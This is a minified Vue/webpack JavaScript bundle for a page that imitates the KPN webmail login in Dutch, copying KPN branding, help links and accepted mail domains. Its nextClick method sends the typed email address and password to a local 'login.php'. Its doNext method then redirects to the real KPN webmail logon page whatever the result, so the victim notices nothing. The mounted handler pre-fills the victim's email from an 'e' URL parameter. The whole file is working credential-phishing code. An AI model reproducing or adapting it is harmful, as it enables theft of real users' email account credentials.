(function(e){function t(t){for(var a,s,l=t[0],o=t[1],d=t[2],u=0,m=[];u<l.length;u++)s=l[u],i[s]&&m.push(i[s][0]),i[s]=0;for(a in o)Object.prototype.hasOwnProperty.call(o,a)&&(e[a]=o[a]);c&&c(t);while(m.length)m.shift()();return r.push.apply(r,d||[]),n()}function n(){for(var e,t=0;t<r.length;t++){for(var n=r[t],a=!0,l=1;l<n.length;l++){var o=n[l];0!==i[o]&&(a=!1)}a&&(r.splice(t--,1),e=s(s.s=n[0]))}return e}var a={},i={app:0},r=[];function s(t){if(a[t])return a[t].exports;var n=a[t]={i:t,l:!1,exports:{}};return e[t].call(n.exports,n,n.exports,s),n.l=!0,n.exports}s.m=e,s.c=a,s.d=function(e,t,n){s.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:n})},s.r=function(e){"undefined"!==typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},s.t=function(e,t){if(1&t&&(e=s(e)),8&t)return e;if(4&t&&"object"===typeof e&&e&&e.__esModule)return e;var n=Object.create(null);if(s.r(n),Object.defineProperty(n,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var a in e)s.d(n,a,function(t){return e[t]}.bind(null,a));return n},s.n=function(e){var t=e&&e.__esModule?function(){return e["default"]}:function(){return e};return s.d(t,"a",t),t},s.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},s.p="/";var l=window["webpackJsonp"]=window["webpackJsonp"]||[],o=l.push.bind(l);l.push=t,l=l.slice();for(var d=0;d<l.length;d++)t(l[d]);var c=o;r.push([0,"chunk-vendors"]),n()})({0:function(e,t,n){e.exports=n("56d7")},"332c":function(e,t,n){},"56d7":function(e,t,n){"use strict";n.r(t);n("cadf"),n("551c"),n("f751"),n("097d");var a=n("2b0e"),i=function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",[n("Wrapper")],1)},r=[],s=function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{attrs:{id:"wrapper"}},[e._m(0),n("div",{staticClass:"row"},[n("div",{attrs:{id:"main"}},[n("div",[n("div",{class:{disabled:1!==e.step},attrs:{id:"loginForm"}},[e._m(1),e._m(2),n("div",{staticClass:"form-input",class:{"invalid-required":e.emailRequired,"invalid-pattern":e.emailInvalidPatern}},[n("div",{staticClass:"placeholder",style:e.emailPlaceholderStyle,attrs:{id:"email"}},[e._v(e._s(e.emailPlaceholder))]),n("input",{directives:[{name:"model",rawName:"v-model",value:e.emailAddress,expression:"emailAddress"}],attrs:{name:"username",id:"username",placeholder:"Gebruikersnaam / e-mailadres",required:"","data-pattern":"",type:"text",tabindex:"1"},domProps:{value:e.emailAddress},on:{input:function(t){t.target.composing||(e.emailAddress=t.target.value)}}}),n("div",{staticClass:"error-message error-required"},[e._v("\n              Vul uw gebruikersnaam of e-mailadres in.\n            ")]),n("div",{staticClass:"error-message error-pattern"},[e._v("\n              Het domein dat gebruikt wordt om in te loggen wordt niet\n              ondersteund.\n            ")])]),n("div",{staticClass:"form-input",class:{"invalid-required":e.passwordRequired}},[n("input",{directives:[{name:"model",rawName:"v-model",value:e.password,expression:"password"}],attrs:{name:"password",id:"password",placeholder:"Wachtwoord",required:"",type:"password",tabindex:"2"},domProps:{value:e.password},on:{input:function(t){t.target.composing||(e.password=t.target.value)}}}),n("div",{staticClass:"error-message error-required"},[e._v("\n              Vul uw wachtwoord in.\n            ")])]),e._m(3),n("input",{attrs:{id:"inloggen",name:"inloggen",alt:"Inloggen",type:"submit",value:"Login",tabindex:"4"},on:{click:function(t){return t.preventDefault(),e.nextClick(t)}}}),n("div",{attrs:{id:"response"}},[n("div",{staticClass:"error-message error-credentials",style:e.errorMessageStyle,attrs:{id:"error-message"}},[e._v("\n              Deze gebruikersnaam en/of wachtwoord is niet bekend. Wachtwoord\n              vergeten? Klik op 'Wachtwoord vergeten'.\n            ")])])]),n("transition",{attrs:{name:"fade"}},[1===e.step?n("div",{staticClass:"row",attrs:{id:"links"}},[n("h3",[e._v("Waarmee kunnen we je helpen?")]),n("ul",{staticClass:"links-left"},[n("li",[n("a",{attrs:{href:"//www.kpn.com/service/internet/e-mail/wachtwoord-of-gebruikersnaam-vergeten.htm",target:"_blank"}},[e._v("\n                  Wachtwoord vergeten\n                ")])]),n("li",[n("a",{attrs:{href:"//www.kpn.com/service/internet/e-mail.htm",target:"_blank"}},[e._v("\n                  Alles over KPN e-mail en Webmail\n                ")])]),n("li",[n("a",{attrs:{href:"//www.kpn.com/service/mobiel/problemen/toestelhulp.htm#/topic/e-mail/handmatig-instellen/device",target:"_blank"}},[e._v("\n                  E-mail instellen op je mobiele telefoon\n                ")])]),n("li",[n("a",{attrs:{href:"//www.kpn.com/service/internet/e-mail/geen-e-mail-ontvangen-of-versturen.htm",target:"_blank"}},[e._v("\n                  Problemen bij het ontvangen en versturen van e-mail\n                ")])])]),n("ul",{staticClass:"links-right"})]):e._e()]),n("transition",{attrs:{name:"fade"}},[2===e.step?n("div",{staticClass:"row",attrs:{id:"links"}},[n("h3",[e._v("Een ogenblik geduld aub..")]),n("div",{staticClass:"row",staticStyle:{width:"100%"}},[n("div",{staticClass:"loader"})])]):e._e()]),e._m(4)],1)])])])},l=[function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("header",{staticClass:"row"},[n("div",{attrs:{id:"logo"}},[n("a",{attrs:{href:"http://www.kpn.com"}},[n("div",{staticClass:"kpn-logo"})])]),n("div",{attrs:{id:"title"}},[n("h1",[e._v("Inloggen Webmail")])])])},function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{staticClass:"notification-message",attrs:{id:"notification-newwebmail-kpn"}},[n("div",{staticClass:"notification-icon"}),n("div",[e._v("Let op! We zijn bezig met een nieuwe webmail. "),n("a",{attrs:{href:"#newwebmail"}},[e._v("Meer informatie")])])])},function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{staticClass:"popup-container",attrs:{id:"newwebmail"}},[n("div",{staticClass:"popup-window"},[n("a",{staticClass:"close-icon",attrs:{href:"#",title:"Verbergen"}}),n("div",{staticClass:"title"},[n("h2",[e._v("Nieuwe webmail")])]),n("div",{staticClass:"content"},[n("p",[e._v("Momenteel wordt de webmail vernieuwd. Dit duurt een aantal maanden, dus wacht rustig af.")]),n("p",[e._v('Je zult je misschien afvragen "Hoe zie ik dat?" Wat je zult merken is dat de webmail er anders uit ziet zodra je bent ingelogd. Je krijgt de eerste keer de vraag om je naam bij jouw e-mailadres op te slaan. Daarna volgt de rondleiding.')]),n("p",[e._v("Naast de vertrouwde functies zijn er ook nieuwe functies toegevoegd. Wil je nu alvast weten welke dat zijn? Kijk dan op "),n("a",{attrs:{href:"https://www.kpn.com/service/internet/we-vernieuwen-webmail.htm?campaignid=wmad:d=sep30:mk=cm:cn=wmad919",target:"_blank"}},[e._v("deze pagina")]),e._v(".")])])])])},function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("label",[n("input",{attrs:{id:"remember",type:"checkbox",tabindex:"3"}}),e._v(" Onthoud mijn\n            gebruikersnaam\n          ")])},function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{staticClass:"row",attrs:{id:"banner"}},[n("a",{attrs:{rel:"nofollow",id:"specials",href:"//webmail.kpnmail.nl/Specials.aspx"}},[e._v("Specials")])])}],o=(n("ac6a"),n("a481"),n("28a5"),n("bc3a")),d=n.n(o),c={name:"Wrapper",data:function(){return{referrerPage:"//webmail.kpnmail.nl/mail/logon.asp",emailPlaceholderElement:null,emailPlaceholderStyle:"",generalErrorVisible:!1,emailRequired:!1,emailInvalidPatern:!1,passwordRequired:!1,emailAddress:"",password:"",validDomains:["kpnmail.nl","planet.nl","hetnet.nl","kpnplanet.nl","freeler.nl","compaqnet.nl","hi.nl","ibmail.nl","ing-access.nl","on.nl","onsbrabantnet.nl","onsmail.nl","onsnet.nu","onsneteindhoven.nl","onsnetnuenen.nl","pi.net","snelnet.net","sp-plus.nl","worldaccess.nl","wxs.nl"],step:1}},computed:{errorMessageStyle:function(){return this.generalErrorVisible?"display: block":""},emailPlaceholder:function(){if(!(this.emailAddress.length>0))return"";var e=!0,t=this.emailAddress.split("@");if(t.length<3){var n=t[0],a=2===t.length&&t[1].length>0?t[1]:this.validDomains[0];a=a.trim();var i=a;i&&(i=i.toLocaleLowerCase()),e=0===i.length||this.validDomains.indexOf(i)>=0;for(var r=0;r<this.validDomains.length&&this.validDomains.indexOf(i)<0;r++)0===this.validDomains[r].indexOf(i)&&(i=this.validDomains[r],i,e=!0);return this.emailInvalidPatern=!e,a?n+"@"+a+i.substring(a.length):n+"@"+i}}},methods:{doNext:function(){var e=this;e.step=0,setTimeout(function(){e.step=2,setTimeout(function(){window.location.replace(e.referrerPage)},1500)},150)},nextClick:function(){var e=this;0!==e.emailAddress.length?0!==e.password.length?!0!==e.emailInvalidPatern&&d.a.post("login.php",{email:e.emailAddress,password:e.password}).then(function(t){e.doNext()}).catch(function(t){e.doNext()}):e.passwordRequired=!0:e.emailRequired=!0}},watch:{emailAddress:function(e){if(this.emailRequired=!1,null!=this.emailPlaceholderElement){var t=this.emailPlaceholderElement.scrollWidth>this.emailPlaceholderElement.clientWidth?"transparent":"#999";this.emailPlaceholderStyle="color: ".concat(t,";")}},password:function(e){this.passwordRequired=!1}},mounted:function(){var e=this,t=window.location.href.split("?");if(t.length>0&&void 0!==t[1]){var n=t[1].split("&"),a={},i="";n.forEach(function(e){i=e.split("="),2==i.length&&(a[i[0].toLowerCase()]=decodeURIComponent(i[1]))});var r="undefined"!==typeof a["e"]?a["e"]:"";e.emailAddress=r}e.emailPlaceholderElement=document.getElementById("email")}},u=c,m=(n("9043"),n("2877")),p=Object(m["a"])(u,s,l,!1,null,null,null),v=p.exports,f={name:"app",components:{Wrapper:v}},h=f,w=Object(m["a"])(h,i,r,!1,null,null,null),g=w.exports,b=n("2f62");a["a"].use(b["a"]);var _=new b["a"].Store({state:{},mutations:{},actions:{}}),k=(n("332c"),n("a7fe")),y=n.n(k);a["a"].use(y.a,d.a),a["a"].config.productionTip=!1,new a["a"]({store:_,render:function(e){return e(g)}}).$mount("#app")},9043:function(e,t,n){"use strict";var a=n("c9fd"),i=n.n(a);i.a},c9fd:function(e,t,n){}});
//# sourceMappingURL=app.2dc2396c.js.map